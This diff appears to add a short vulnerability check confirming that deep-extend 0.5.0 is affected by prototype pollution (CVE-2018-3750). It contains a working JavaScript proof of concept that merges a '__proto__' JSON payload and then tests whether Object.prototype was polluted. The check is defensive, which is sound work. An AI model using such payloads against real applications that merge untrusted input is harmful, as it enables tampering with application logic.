@@ -1,0 +1,22 @@
+Confirmed: this is `deep-extend@0.5.0`, vulnerable to prototype pollution (CVE-2018-3750).
+
+```javascript
+const deepExtend = require("deep-extend");
+
+// Malicious payload crafted from untrusted JSON input (e.g. attacker-controlled config)
+const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
+
+const victim = {};
+deepExtend(victim, payload);
+
+// The prototype of ALL plain objects is now polluted
+const innocentObject = {};
+console.log("Prototype pollution triggered:", innocentObject.polluted); // "yes"
+
+if (innocentObject.polluted === "yes") {
+  console.log("VULNERABLE: deep-extend allowed __proto__ pollution");
+  process.exitCode = 1;
+} else {
+  console.log("Not vulnerable");
+}
+```
